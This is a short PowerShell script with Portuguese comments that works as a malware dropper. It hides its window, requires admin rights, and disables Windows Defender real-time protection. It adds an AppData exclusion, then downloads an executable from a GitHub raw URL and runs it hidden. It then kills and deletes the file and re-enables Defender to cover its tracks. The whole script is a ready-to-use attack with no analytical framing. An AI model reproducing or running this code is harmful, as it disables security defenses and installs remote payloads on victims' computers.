# Esconder janela atual
$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
Add-Type -Name win -MemberDefinition $t -Namespace native
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess()).MainWindowHandle, 0)

# Checar admin
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Error "Requer admin." ; exit 1
}

# Log simples
$log = "$env:TEMP\script_log.txt"
"$(Get-Date) - Iniciado." | Out-File $log -Append

# Desativar Defender realtime
Set-MpPreference -DisableRealtimeMonitoring $true
"Defender desativado." | Out-File $log -Append

# Exclusão de caminho
Add-MpPreference -ExclusionPath "$env:APPDATA"
"Exclusão adicionada." | Out-File $log -Append

# Criar dir
$dir = "$env:APPDATA\dump"
if (-not (Test-Path $dir)) { mkdir $dir }
Set-Location $dir
"Dir criado." | Out-File $log -Append

# Baixar, desbloquear e executar
$url = "https://github.com/user337666/brow666/raw/refs/heads/main/awis.exe"
$path = "$dir\awis.exe"
iwr $url -o $path
Unblock-File $path -ea SilentlyContinue
sp $path -win h
"EXE baixado, desbloqueado e executado." | Out-File $log -Append

# Aguardar, matar e remover
sl 6
Stop-Process -Name awis -Force -ea SilentlyContinue
ri $path -f
"Cleanup feito." | Out-File $log -Append

# Restaurar Defender
Set-MpPreference -DisableRealtimeMonitoring $false
"Defender restaurado." | Out-File $log -Append

"Finalizado." | Out-File $log -Append
